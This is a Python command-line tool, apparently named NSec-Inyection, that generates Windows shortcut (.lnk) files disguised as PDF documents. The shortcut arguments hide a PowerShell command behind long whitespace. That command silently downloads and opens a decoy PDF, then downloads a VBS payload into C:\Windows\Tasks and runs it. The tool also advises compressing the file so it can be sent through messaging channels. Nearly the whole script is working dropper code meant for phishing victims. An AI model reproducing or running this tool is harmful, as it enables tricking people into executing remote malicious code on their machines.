# NSec-Inyection by @nervius25

import os
from win32com.client import Dispatch

options = {
    'exec': '',
    'namefile': '',
    'description': '',
    'urlpdf': '',
    'namepdf': '',
    'urlvbs': '',
    'namevbs': '',
}

first_execution = True

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banned_ns():
        print(f"\x1b[1m\x1b[31mPDF\x1b[0m \x1b[1mHelp\x1b[0m")
        print("|")
        print("|―― \x1b[1m\x1b[33mCommands:\x1b[0m")
        print("|   |―― help                       :: Show help.")
        print("|   |―― show options               :: Display current options.")
        print("|   |―― set <variable> <value>     :: Set the value of a variable.")
        print("|   |―― make                       :: Create the file.")
        print("|   |―― clear                      :: Clear the screen.")
        print("|   |―― exit, quit, e or q         :: Exit PDF - N-Sec.")
        print("|")
        print("|―― \x1b[1m\x1b[34mOptions:\x1b[0m")
        print("|   |―― exec                       :: Path of the file executor.")
        print("|       |―― Examples")
        print(r"|                   ╙ \\localhost\\c$\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe")
        print(r"|                   ╙  \\localhost\\c$\Windows\System32\cmd.exe")
        print("|")
        print("|   |―― namefile                   :: Name of the pdf file. (without extension)")
        print("|       |―― Examples")
        print("|                   ╙ test")
        print("|                   ╙ try")
        print("|")
        print("|   |―― description                :: Description of the file.")
        print("|       |―― Examples")
        print("|                   ╙ my test")
        print("|                   ╙ my try")
        print("|")
        print("|   |―― urlpdf                     :: Url to download the image (you can use url shorturl).")
        print("|       |―― Examples")
        print("|                   ╙ http://127.0.0.1/test.pdf")
        print("|                   ╙ https://your-domain/test.pdf")
        print("|                   ╙ https://shorturl[.]at//test.pdf")
        print("|")
        print("|   |―― namepdf                    :: Name of the file when it is saved.")
        print("|       |―― Examples")
        print("|                   ╙ C:/Users/Public/test.pdf")
        print("|")
        print("|   |―― urlvbs                     :: Url to download the vbs file (you can use url shortener).")
        print("|       |―― Examples")
        print("|                   ╙ http://127.0.0.1/test.vbs")
        print("|                   ╙ https://your-domain/test.vbs")
        print("|                   ╙ https://shorturl[.]at//test.vbs")
        print("|")
        print("|   |―― namevbs                    :: Name of the file when it is saved.")
        print("|       |―― Examples")
        print("|                   ╙ C:/Windows/Tasks/test.vbs")
        print("")

def help():
        print(f"\x1b[1mHelp:\x1b[0m")
        print("|")
        print("|―― \x1b[1m\x1b[33mCommands:\x1b[0m")
        print("|   |―― show options               :: Display current options.")
        print("|   |―― set <variable> <value>     :: Set the value of a variable.")
        print("|   |―― make                       :: Create the file.")
        print("|   |―― clear                      :: Clear the screen.")
        print("|   |―― exit, quit, e or q         :: Exit PDF - N-Sec.")
        print("|")
        print("|―― \x1b[1m\x1b[34mOptions:\x1b[0m")
        print("|   |―― exec                       :: Path of the file executor.")
        print("|       |―― Examples")
        print(r"|                   ╙ \\localhost\\c$\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe")
        print(r"|                   ╙  \\localhost\\c$\Windows\System32\cmd.exe")
        print("|")
        print("|   |―― namefile                   :: Name of the pdf file. (without extension)")
        print("|       |―― Examples")
        print("|                   ╙ test")
        print("|                   ╙ try")
        print("|")
        print("|   |―― description                :: Description of the file.")
        print("|       |―― Examples")
        print("|                   ╙ my test")
        print("|                   ╙ my try")
        print("|")
        print("|   |―― urlpdf                     :: Url to download the image (you can use url shorturl).")
        print("|       |―― Examples")
        print("|                   ╙ http://127.0.0.1/test.pdf")
        print("|                   ╙ https://your-domain/test.pdf")
        print("|                   ╙ https://shorturl[.]at//test.pdf")
        print("|")
        print("|   |―― namepdf                    :: Name of the file when it is saved.")
        print("|       |―― Examples")
        print("|                   ╙ C:/Users/Public/test.pdf")
        print("|")
        print("|   |―― urlvbs                     :: Url to download the vbs file (you can use url shortener).")
        print("|       |―― Examples")
        print("|                   ╙ http://127.0.0.1/test.vbs")
        print("|                   ╙ https://your-domain/test.vbs")
        print("|                   ╙ https://shorturl[.]at//test.vbs")
        print("|")
        print("|   |―― namevbs                    :: Name of the file when it is saved.")
        print("|       |―― Examples")
        print("|                   ╙ C:/Windows/Tasks/test.vbs")
        print("")

def show_options():
    print("\x1b[1m[*]\x1b[0m \x1b[34mOptions\x1b[0m \x1b[31mPDF\x1b[0m\x1b[1m:\x1b[0m")
    for key, value in options.items():
        print(f"{key}: {value}")
    print()

def set_option(option, value):
    if option in options:
        options[option] = value
        print(f"\x1b[1m[*]\x1b[0m {option} set to: {value}\n")
    else:
        print(f"\n\x1b[31m[!]\x1b[0m Invalid option: {option}\n")

def make_shortcut():
    required_variables = ['exec', 'namefile', 'description', 'urlpdf', 'namepdf', 'urlvbs', 'namevbs']
    
    missing_variables = [var for var in required_variables if not options[var]]
    if missing_variables:
        print("\n\x1b[31m[!]\x1b[0m Incomplete options. Please 'set' values for the following variables:")
        for var in missing_variables:
            print(f"    {var}")
        print()
        return

    current_directory = os.getcwd()
    output_directory = os.path.join(current_directory, "output")
    os.makedirs(output_directory, exist_ok=True)

    exec_path = options['exec']
    namefile = options['namefile']
    description = options['description']
    urlpdf = options['urlpdf']
    namepdf = options['namepdf']
    urlvbs = options['urlvbs']
    namevbs = options['namevbs']

    shortcutPath = os.path.join(output_directory, f"{namefile}.pdf.lnk")
    iconPath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    iconIndex = 13

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcutPath)
    shortcut.TargetPath = exec_path
    shortcut.Arguments = f"                                                                                                                                                                                                                                           -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest {urlpdf} -O C:\\Users\\Public\\{namepdf}.pdf; Start-Process C:\\Users\\Public\\{namepdf}.pdf; Invoke-WebRequest {urlvbs} -O C:\\Windows\\Tasks\\{namevbs}.vbs; Start-Process C:\\Windows\\Tasks\\{namevbs}.vbs"
    shortcut.WindowStyle = 7
    shortcut.IconLocation = f"{iconPath},{iconIndex}"
    shortcut.Description = description
    shortcut.Save()
    print("\n\x1b[32m[*] DONE!\x1b[0m - \x1b[1mSave file in output/\x1b[0m\n")
    print("""\n\x1b[31m[**] IMPORT:\x1b[0m .lnk files cannot be sent directly by the various means of communication and must be compressed or otherwise.\n""")

while True:
    try:
        if first_execution:
            clear()
            banned_ns()
            first_execution = False

        command = input("\x1b[31mPDF\x1b[0m> ").strip().split()

        if not command:
            continue

        if command[0] == 'show' and command[1] == 'options':
            show_options()
        elif command[0] == 'set':
            if len(command) == 3:
                set_option(command[1], command[2])
            else:
                print("\n\x1b[31m[!]\x1b[0m Invalid command. Type 'help' for available commands or try 'set <variable> <value>'\n")

        elif command[0] == 'make':
            make_shortcut()

        elif command[0] == 'clear':
            clear()

        elif command[0] == 'help':
            help()

        elif command[0].lower() == 'exit':
            print("Have a nice day.\n")
            exit()

        elif command[0].lower() == 'quit':
            print("Have a nice day.\n")
            exit()

        elif command[0].lower() == 'e':
            print("Have a nice day.\n")
            exit()

        elif command[0].lower() == 'q':
            print("Have a nice day.\n")
            exit()

        else:
            print("\n\x1b[31mThe command you entered does not exist.\x1b[0m\n")
            
    except (KeyboardInterrupt, EOFError):
        print("Have a nice day.\n")
        exit()

# NSec-Inyection by @nervius25